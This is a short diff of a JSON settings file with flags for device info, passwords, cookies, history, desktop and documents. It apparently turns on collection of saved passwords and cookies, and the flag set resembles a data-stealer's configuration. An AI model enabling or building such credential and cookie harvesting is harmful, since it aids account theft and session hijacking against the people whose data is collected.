@@ -1,7 +1,7 @@
 {
     "device_info": "true",
-    "passwords": "false",
-    "cookies": "false",
+    "passwords": "true",
+    "cookies": "true",
     "history": "true",
     "desktop": "false",
     "documents": "false",
